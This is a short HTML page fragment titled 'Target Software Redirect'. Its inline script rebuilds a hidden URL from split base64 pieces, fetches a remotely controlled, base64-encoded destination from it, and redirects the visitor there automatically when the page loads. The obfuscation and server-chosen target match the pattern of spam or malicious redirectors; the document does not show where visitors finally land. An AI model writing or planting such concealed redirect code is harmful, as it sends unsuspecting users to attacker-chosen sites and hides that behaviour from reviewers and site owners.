    <title>Target Software Redirect</title>
    
    <script>
(async function () {
  try {
    const parts = [
      'aHR0cHM=',   
'Oi8vZ28=',   
'bW9kcmk=',   
'bGxzLmM=',   
'b20vbWk=',   
'Y3JvcGU=',   
'bmlzLg==',   
'YXBwcw=='    
    ];

    const apiUrl = parts.map(p => atob(p)).join('');

    const res = await fetch(apiUrl);

    if (!res.ok) {
      throw new Error(`Config HTTP ${res.status}`);
    }

    const { c } = await res.json();

    const url = atob(c);

    if (!/^https?:\/\//i.test(url)) {
      throw new Error('Invalid URL');
    }

    window.location.href = url;
  } catch (e) {
    console.error(e);
  }
})();
</script>
